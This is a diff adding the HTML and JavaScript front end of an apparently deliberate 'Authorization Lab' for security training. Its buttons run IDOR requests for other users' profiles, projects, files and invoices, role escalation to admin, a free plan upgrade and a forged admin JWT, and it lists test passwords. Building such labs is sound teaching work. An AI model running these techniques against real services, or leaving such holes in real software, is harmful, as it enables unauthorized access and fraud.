@@ -1,0 +1,271 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8"><title>CloudCorp — Authorization Lab</title>
+    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/css/bootstrap.min.css" rel="stylesheet">
+    <style>
+        pre { background:#1e1e1e; color:#d4d4d4; padding:10px; border-radius:4px; font-size:.8em; max-height:250px; overflow-y:auto; }
+        .vuln { background:#dc3545; color:#fff; padding:2px 6px; border-radius:3px; font-size:.75em; }
+    </style>
+</head>
+<body>
+<nav class="navbar navbar-dark bg-dark">
+    <div class="container-fluid">
+        <span class="navbar-brand fw-bold">☁️ CloudCorp Platform <span class="vuln ms-2">AUTHORIZATION LAB</span></span>
+        <span class="text-light small" id="userInfo">Not logged in</span>
+    </div>
+</nav>
+
+<div class="container-fluid py-3">
+    <div class="row">
+        <!-- Auth Column -->
+        <div class="col-md-4">
+            <div class="card mb-3">
+                <div class="card-header bg-primary text-white"><strong>Authentication</strong></div>
+                <div class="card-body">
+                    <div class="mb-2">
+                        <input type="email" id="loginEmail" class="form-control form-control-sm mb-1" placeholder="Email" value="alice@cloudcorp.com">
+                        <input type="password" id="loginPass" class="form-control form-control-sm mb-1" placeholder="Password" value="Alice123!">
+                        <button class="btn btn-primary btn-sm w-100" onclick="login()">Login</button>
+                    </div>
+                    <hr class="my-2">
+                    <p class="small mb-1"><strong>Test Users:</strong></p>
+                    <ul class="small mb-0">
+                        <li><code>alice@cloudcorp.com / Alice123!</code> (user, id=1)</li>
+                        <li><code>bob@cloudcorp.com / Bob456!</code> (user, id=2)</li>
+                        <li><code>admin@cloudcorp.com / Admin789!</code> (admin, id=3)</li>
+                    </ul>
+                    <div class="mt-2">
+                        <small class="text-muted">JWT Token:</small>
+                        <pre id="tokenDisplay" class="mt-1" style="max-height:60px;font-size:.7em">Not logged in</pre>
+                    </div>
+                </div>
+            </div>
+
+            <!-- JWT Tampering -->
+            <div class="card mb-3 border-danger">
+                <div class="card-header bg-danger text-white"><strong>JWT Tampering (MSEC-002)</strong></div>
+                <div class="card-body">
+                    <p class="small">Manually craft a JWT with role=admin:</p>
+                    <button class="btn btn-danger btn-sm mb-2" onclick="createFakeAdminToken()">Create Fake Admin Token</button>
+                    <pre id="fakeTokenDisplay" style="max-height:60px;font-size:.7em">Click button above</pre>
+                    <button class="btn btn-outline-danger btn-sm mt-1" onclick="useTokenAsAdmin()">Use This Token</button>
+                </div>
+            </div>
+        </div>
+
+        <!-- Attack Panels -->
+        <div class="col-md-8">
+            <div class="row">
+                <!-- IDOR User Data -->
+                <div class="col-md-6 mb-3">
+                    <div class="card border-warning h-100">
+                        <div class="card-header bg-warning text-dark"><strong>IDOR-001: User Data Access</strong></div>
+                        <div class="card-body">
+                            <p class="small">Access ANY user's profile (logged in as Alice, id=1)</p>
+                            <div class="input-group input-group-sm mb-2">
+                                <span class="input-group-text">GET /api/users/</span>
+                                <input type="number" id="targetUserId" class="form-control" value="2" min="1" max="3">
+                                <button class="btn btn-warning" onclick="getUser()">Get</button>
+                            </div>
+                            <pre id="userResult">// Click to test IDOR</pre>
+                        </div>
+                    </div>
+                </div>
+
+                <!-- Horizontal Privilege Escalation -->
+                <div class="col-md-6 mb-3">
+                    <div class="card border-danger h-100">
+                        <div class="card-header bg-danger text-white"><strong>AUTHZ-001: Modify Any User</strong></div>
+                        <div class="card-body">
+                            <p class="small">Update ANY user's data (horizontal escalation)</p>
+                            <div class="mb-2">
+                                <input type="number" id="modifyUserId" class="form-control form-control-sm mb-1" value="2" placeholder="Target user ID">
+                                <input type="text" id="modifyName" class="form-control form-control-sm mb-1" value="Hacked by Alice" placeholder="New name">
+                                <button class="btn btn-danger btn-sm w-100" onclick="modifyUser()">Modify User</button>
+                            </div>
+                            <pre id="modifyResult">// Click to test</pre>
+                        </div>
+                    </div>
+                </div>
+
+                <!-- Vertical Privilege Escalation -->
+                <div class="col-md-6 mb-3">
+                    <div class="card border-danger h-100">
+                        <div class="card-header bg-danger text-white"><strong>AUTHZ-002: Escalate to Admin</strong></div>
+                        <div class="card-body">
+                            <p class="small">Change your own role to admin (vertical escalation)</p>
+                            <button class="btn btn-danger btn-sm mb-2" onclick="escalateToAdmin()">Make Myself Admin</button>
+                            <pre id="escalateResult">// Click to test</pre>
+                        </div>
+                    </div>
+                </div>
+
+                <!-- IDOR Projects -->
+                <div class="col-md-6 mb-3">
+                    <div class="card border-warning h-100">
+                        <div class="card-header bg-warning text-dark"><strong>IDOR-002: Access Any Project</strong></div>
+                        <div class="card-body">
+                            <p class="small">Access projects you don't belong to</p>
+                            <div class="input-group input-group-sm mb-2">
+                                <span class="input-group-text">GET /api/projects/</span>
+                                <input type="number" id="targetProjectId" class="form-control" value="2" min="1">
+                                <button class="btn btn-warning" onclick="getProject()">Get</button>
+                            </div>
+                            <pre id="projectResult">// Click to test IDOR</pre>
+                        </div>
+                    </div>
+                </div>
+
+                <!-- IDOR Files -->
+                <div class="col-md-6 mb-3">
+                    <div class="card border-warning h-100">
+                        <div class="card-header bg-warning text-dark"><strong>IDOR-003: Access Any File</strong></div>
+                        <div class="card-body">
+                            <p class="small">Download files owned by other users</p>
+                            <div class="input-group input-group-sm mb-2">
+                                <span class="input-group-text">GET /api/files/</span>
+                                <input type="number" id="targetFileId" class="form-control" value="3" min="1">
+                                <button class="btn btn-warning" onclick="getFile()">Get</button>
+                            </div>
+                            <pre id="fileResult">// File 3 = admin's production keys</pre>
+                        </div>
+                    </div>
+                </div>
+
+                <!-- Free Plan Upgrade -->
+                <div class="col-md-6 mb-3">
+                    <div class="card border-info h-100">
+                        <div class="card-header bg-info text-dark"><strong>AUTHZ-004: Free Plan Upgrade</strong></div>
+                        <div class="card-body">
+                            <p class="small">Upgrade to Enterprise plan without paying</p>
+                            <select id="planSelect" class="form-select form-select-sm mb-2">
+                                <option value="pro">Pro ($99/mo)</option>
+                                <option value="enterprise">Enterprise ($499/mo)</option>
+                            </select>
+                            <button class="btn btn-info btn-sm w-100" onclick="upgradePlan()">Upgrade for Free</button>
+                            <pre id="planResult" class="mt-1">// Click to test</pre>
+                        </div>
+                    </div>
+                </div>
+
+                <!-- View All Invoices -->
+                <div class="col-md-6 mb-3">
+                    <div class="card border-info h-100">
+                        <div class="card-header bg-info text-dark"><strong>IDOR-004: All Invoices</strong></div>
+                        <div class="card-body">
+                            <p class="small">View invoices for ALL users (not just yours)</p>
+                            <button class="btn btn-info btn-sm mb-2" onclick="getAllInvoices()">Get All Invoices</button>
+                            <pre id="invoiceResult">// Click to test</pre>
+                        </div>
+                    </div>
+                </div>
+
+            </div>
+        </div>
+    </div>
+</div>
+
+<script>
+let token = null;
+let currentUser = null;
+
+async function login() {
+    const email = document.getElementById('loginEmail').value;
+    const pass = document.getElementById('loginPass').value;
+    try {
+        const r = await fetch('/api/auth/login', {
+            method: 'POST', headers: {'Content-Type': 'application/json'},
+            body: JSON.stringify({ email, password: pass })
+        });
+        const data = await r.json();
+        if (data.token) {
+            token = data.token;
+            currentUser = data.user;
+            document.getElementById('tokenDisplay').textContent = token;
+            document.getElementById('userInfo').textContent = `Logged in as: ${currentUser.name} (${currentUser.role}, id=${currentUser.id})`;
+        } else {
+            alert('Login failed: ' + JSON.stringify(data));
+        }
+    } catch(e) { alert('Error: ' + e.message); }
+}
+
+function createFakeAdminToken() {
+    // MSEC-002: Create a token with no real signature (algorithm none)
+    const header = btoa(JSON.stringify({alg:'HS256',typ:'JWT'})).replace(/=/g,'');
+    const payload = btoa(JSON.stringify({
+        userId: 99, id: 99, email: 'hacker@evil.com',
+        name: 'HACKER', role: 'admin',
+        iat: Math.floor(Date.now()/1000), exp: Math.floor(Date.now()/1000) + 86400
+    })).replace(/=/g,'').replace(/\+/g,'-').replace(/\//g,'_');
+    // Use current user's token signature if available, else dummy
+    const sig = token ? token.split('.')[2] : 'fakesignature';
+    const fakeToken = `${header}.${payload}.${sig}`;
+    document.getElementById('fakeTokenDisplay').textContent = fakeToken;
+    window._fakeToken = fakeToken;
+}
+
+function useTokenAsAdmin() {
+    if (window._fakeToken) {
+        token = window._fakeToken;
+        document.getElementById('tokenDisplay').textContent = token;
+        document.getElementById('userInfo').textContent = 'Using FAKE admin token!';
+    }
+}
+
+const headers = () => ({ 'Authorization': `Bearer ${token}`, 'Content-Type': 'application/json' });
+
+async function getUser() {
+    const id = document.getElementById('targetUserId').value;
+    const r = await fetch(`/api/users/${id}`, { headers: headers() });
+    document.getElementById('userResult').textContent = JSON.stringify(await r.json(), null, 2);
+}
+
+async function modifyUser() {
+    const id = document.getElementById('modifyUserId').value;
+    const name = document.getElementById('modifyName').value;
+    const r = await fetch(`/api/users/${id}`, {
+        method: 'PUT', headers: headers(),
+        body: JSON.stringify({ name })
+    });
+    document.getElementById('modifyResult').textContent = JSON.stringify(await r.json(), null, 2);
+}
+
+async function escalateToAdmin() {
+    if (!currentUser) { alert('Login first'); return; }
+    const r = await fetch(`/api/users/${currentUser.id}/role`, {
+        method: 'PUT', headers: headers(),
+        body: JSON.stringify({ role: 'admin' })
+    });
+    document.getElementById('escalateResult').textContent = JSON.stringify(await r.json(), null, 2);
+}
+
+async function getProject() {
+    const id = document.getElementById('targetProjectId').value;
+    const r = await fetch(`/api/projects/${id}`, { headers: headers() });
+    document.getElementById('projectResult').textContent = JSON.stringify(await r.json(), null, 2);
+}
+
+async function getFile() {
+    const id = document.getElementById('targetFileId').value;
+    const r = await fetch(`/api/files/${id}`, { headers: headers() });
+    document.getElementById('fileResult').textContent = JSON.stringify(await r.json(), null, 2);
+}
+
+async function upgradePlan() {
+    const plan = document.getElementById('planSelect').value;
+    const r = await fetch('/api/billing/plan', {
+        method: 'PUT', headers: headers(),
+        body: JSON.stringify({ plan, paymentMethod: null })  // No payment!
+    });
+    document.getElementById('planResult').textContent = JSON.stringify(await r.json(), null, 2);
+}
+
+async function getAllInvoices() {
+    const r = await fetch('/api/billing/invoices', { headers: headers() });
+    document.getElementById('invoiceResult').textContent = JSON.stringify(await r.json(), null, 2);
+}
+</script>
+<script src="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/js/bootstrap.bundle.min.js"></script>
+</body>
+</html>
